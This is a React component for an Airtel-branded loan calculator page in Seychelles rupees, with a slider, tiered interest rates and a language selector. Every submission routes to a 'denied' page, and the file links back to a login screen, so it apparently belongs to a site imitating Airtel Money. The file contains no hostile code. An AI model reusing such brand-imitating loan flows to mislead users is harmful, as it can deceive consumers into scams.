import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLanguage } from './LanguageContext'; 

function AirtelLoanLimit() {
  const navigate = useNavigate();
  // ADDED: language and setLanguage so we can render the dropdown
  const { language, setLanguage, t } = useLanguage(); 

  // State for the slider
  const [loanAmount, setLoanAmount] = useState(25000);
  const termMonths = 12;
  const processingFee = 100;

  const handleSliderChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setLoanAmount(Number(e.target.value));
  };

  // Dynamic Interest Rate Logic based on the loan amount
  const getInterestRate = (amount: number) => {
    if (amount <= 5000) return 15;
    if (amount <= 10000) return 14;
    if (amount <= 15000) return 13;
    if (amount <= 20000) return 12;
    return 10; // 20,001 to 25,000
  };

  const currentInterestRate = getInterestRate(loanAmount);
  const totalInterestAmount = loanAmount * (currentInterestRate / 100);
  
  // Updated total repayment to include the 100 SR processing fee
  const totalRepayment = loanAmount + totalInterestAmount + processingFee;
  const monthlyRepayment = Math.round(totalRepayment / termMonths);

  return (
    <div className="airtel-page-container">
      <style>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        .airtel-page-container {
          display: flex;
          flex-direction: column;
          min-height: 100vh;
          background-color: #DA1C1C; /* Airtel Red */
          position: relative;
        }

        /* ADDED: HEADER STYLES (Matching other pages) */
        .header-section {
          padding: 40px 24px 30px;
          display: flex;
          flex-direction: column;
          align-items: center;
          position: relative;
        }

        .menu-btn {
          position: absolute;
          left: 20px;
          top: 20px;
          background: none;
          border: none;
          cursor: pointer;
          padding: 8px;
        }

        .lang-selector {
          position: absolute;
          right: 20px;
          top: 20px;
          padding: 8px 12px;
          border-radius: 8px;
          border: 1px solid rgba(0,0,0,0.1);
          background-color: rgba(255, 255, 255, 0.2);
          font-weight: 700;
          color: #1a1a1a;
          cursor: pointer;
          outline: none;
        }

        .lang-selector option {
          color: #000;
        }

        .header-title {
          font-size: 32px;
          font-weight: 900;
          color: #1a1a1a;
          font-style: italic;
          margin-bottom: 6px;
        }

        .header-subtitle {
          font-size: 14px;
          font-weight: 600;
          color: #1a1a1a;
        }

        /* MAIN CARD CONTAINER */
        .loan-card-wrapper {
          flex: 1;
          display: flex;
          justify-content: center;
          align-items: flex-start;
          padding: 0 20px 24px;
        }

        .loan-card {
          background-color: #ffffff;
          width: 100%;
          max-width: 420px;
          border-radius: 24px;
          padding: 32px 24px;
          box-shadow: 0 10px 25px rgba(0,0,0,0.1);
        }

        /* BACK BUTTON */
        .back-btn {
          background: none;
          border: none;
          cursor: pointer;
          display: flex;
          align-items: center;
          gap: 8px;
          color: #6B7280;
          font-size: 15px;
          font-weight: 500;
          margin-bottom: 24px;
          padding: 0;
        }

        /* TYPOGRAPHY */
        .title {
          font-size: 28px;
          font-weight: 900;
          color: #0F172A;
          margin-bottom: 8px;
        }

        .subtitle {
          font-size: 15px;
          color: #64748B;
          margin-bottom: 24px;
        }

        /* AMOUNT BOX (SLIDER) */
        .amount-box {
          background-color: #FEF2F2;
          border: 1px solid #FCA5A5;
          border-radius: 16px;
          padding: 24px;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          margin-bottom: 24px;
        }

        .amount-label {
          font-size: 15px;
          color: #4B5563;
          margin-bottom: 8px;
        }

        .amount-display {
          display: flex;
          align-items: baseline;
          gap: 6px;
          margin-bottom: 24px;
        }

        .amount-value {
          font-size: 42px;
          font-weight: 900;
          color: #0F172A;
          letter-spacing: -1px;
        }

        .amount-currency {
          font-size: 18px;
          color: #4B5563;
          font-weight: 700;
        }

        /* CUSTOM RANGE SLIDER */
        .slider-container {
          width: 100%;
          position: relative;
        }

        .slider {
          -webkit-appearance: none;
          width: 100%;
          height: 8px;
          border-radius: 4px;
          background: #FECACA;
          outline: none;
          cursor: pointer;
        }

        .slider::-webkit-slider-thumb {
          -webkit-appearance: none;
          appearance: none;
          width: 24px;
          height: 24px;
          border-radius: 50%;
          background: #DA1C1C;
          border: 3px solid #ffffff;
          box-shadow: 0 2px 6px rgba(218, 28, 28, 0.4);
          cursor: grab;
        }

        .slider::-webkit-slider-thumb:active {
          cursor: grabbing;
          transform: scale(1.1);
        }

        .slider::-moz-range-thumb {
          width: 24px;
          height: 24px;
          border-radius: 50%;
          background: #DA1C1C;
          border: 3px solid #ffffff;
          box-shadow: 0 2px 6px rgba(218, 28, 28, 0.4);
          cursor: grab;
        }

        .slider::-moz-range-thumb:active {
          cursor: grabbing;
          transform: scale(1.1);
        }

        .slider-limits {
          display: flex;
          justify-content: space-between;
          width: 100%;
          margin-top: 12px;
          font-size: 13px;
          color: #9CA3AF;
          font-weight: 600;
        }

        /* DETAIL ROWS */
        .detail-row {
          background-color: #F8FAFC;
          border: 1px solid #F1F5F9;
          border-radius: 12px;
          padding: 16px 20px;
          display: flex;
          justify-content: space-between;
          align-items: center;
          margin-bottom: 12px;
        }

        .detail-label {
          font-size: 15px;
          color: #475569;
          font-weight: 500;
        }

        .detail-value {
          font-size: 15px;
          font-weight: 800;
          color: #0F172A;
        }

        /* BUTTON */
        .continue-btn {
          width: 100%;
          padding: 18px;
          border-radius: 12px;
          border: none;
          background-color: #F87171;
          color: #0F172A;
          font-size: 16px;
          font-weight: 800;
          cursor: pointer;
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 12px;
          margin-top: 12px;
          transition: all 0.2s;
        }

        .continue-btn:active {
          background-color: #EF4444;
        }

        /* FOOTER ICONS */
        .brand-icons-footer {
          display: flex;
          justify-content: center;
          align-items: center;
          gap: 16px;
          padding: 0 20px 40px;
        }

        .brand-icon {
          display: flex;
          align-items: center;
          justify-content: center;
        }
      `}</style>

      {/* ADDED: HEADER SECTION */}
      <div className="header-section">
        <button className="menu-btn" onClick={() => navigate('/')}>
          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12"></line>
            <line x1="3" y1="6" x2="21" y2="6"></line>
            <line x1="3" y1="18" x2="21" y2="18"></line>
          </svg>
        </button>

        <select 
          className="lang-selector"
          value={language} 
          onChange={(e) => setLanguage(e.target.value as any)}
        >
          <option value="cr">🇸🇨 Kreol</option>
          <option value="en">🇬🇧 English</option>
          <option value="fr">🇫🇷 Français</option>
        </select>

        <h1 className="header-title">{t('brandTitle')}</h1>
        <p className="header-subtitle">{t('brandSubtitle')}</p>
      </div>

      <div className="loan-card-wrapper">
        <div className="loan-card">
          
          <button className="back-btn" onClick={() => navigate(-1)}>
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <line x1="19" y1="12" x2="5" y2="12" />
              <polyline points="12 19 5 12 12 5" />
            </svg>
            {t('backToLogin')}
          </button>

          <h1 className="title">{t('loanLimit')}</h1>
          <p className="subtitle">{t('dragSlider')}</p>

          {/* AMOUNT BOX WITH SLIDER */}
          <div className="amount-box">
            <span className="amount-label">{t('availableAmount')}</span>
            
            <div className="amount-display">
              <span className="amount-value">{loanAmount.toLocaleString('en-US')}</span>
              <span className="amount-currency">SR</span>
            </div>

            <div className="slider-container">
              <input
                type="range"
                min="500"
                max="25000"
                step="500"
                value={loanAmount}
                onChange={handleSliderChange}
                className="slider"
              />
              <div className="slider-limits">
                <span>500 SR</span>
                <span>25,000 SR</span>
              </div>
            </div>
          </div>

          {/* DETAILS (DYNAMIC) */}
          <div className="detail-row">
            <span className="detail-label">{t('loanTerm')}</span>
            <span className="detail-value">{termMonths} {t('months')}</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">{t('interestRate')}</span>
            <span className="detail-value" style={{ color: '#DA1C1C' }}>
              {currentInterestRate}%
            </span>
          </div>
          <div className="detail-row">
            <span className="detail-label">{t('processingFee')}</span>
            <span className="detail-value">{processingFee} SR</span>
          </div>
          <div className="detail-row">
            <span className="detail-label">{t('monthlyPayment')}</span>
            <span className="detail-value">{monthlyRepayment.toLocaleString('en-US')} SR</span>
          </div>

          {/* ACTION BUTTON */}
          <button 
            className="continue-btn" 
            onClick={() => {
              localStorage.setItem('airtelLoanAmount', loanAmount.toString());
              navigate('/airtel-denied');
            }}
          >
            {t('continueLoan')}
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="5" y1="12" x2="19" y2="12" />
              <polyline points="12 5 19 12 12 19" />
            </svg>
          </button>

        </div>
      </div>

      {/* BRAND ICONS FOOTER */}
      <div className="brand-icons-footer">
        {/* Icon 1: Airtel Phone */}
        <div className="brand-icon">
          <div style={{ width: '32px', height: '52px', border: '2px solid #E5E7EB', backgroundColor: '#fff', borderRadius: '6px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', position: 'relative' }}>
            <div style={{ width: '12px', height: '12px', backgroundColor: '#000', borderRadius: '50%', marginBottom: '4px' }}></div>
            <span style={{ fontSize: '9px', fontWeight: 'bold', color: '#000' }}>Airtel</span>
          </div>
        </div>
        
        {/* Icon 2: Lock */}
        <div className="brand-icon">
          <div style={{ width: '36px', height: '48px', backgroundColor: '#1E293B', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
            <svg width="18" height="18" viewBox="0 0 24 24" fill="#FCD34D" stroke="#D97706" strokeWidth="1.5">
              <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
            </svg>
          </div>
        </div>

        {/* Icon 3: Airtel Money */}
        <div className="brand-icon">
          <div style={{ width: '32px', height: '20px', backgroundColor: '#FCD34D', borderRadius: '3px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', border: '1px solid #D97706' }}>
            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Airtel</span>
            <span style={{ fontSize: '8px', fontWeight: '900', color: '#B45309', lineHeight: '1' }}>Money</span>
          </div>
        </div>

        {/* Icon 4: Currency Symbol */}
        <div className="brand-icon">
          <div style={{ width: '36px', height: '36px', backgroundColor: '#FCD34D', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', border: '2px solid #F59E0B' }}>
            <span style={{ fontSize: '18px', fontWeight: '900', color: '#78350F' }}>₣</span>
          </div>
        </div>
      </div>
    </div>
  );
}

export default AirtelLoanLimit;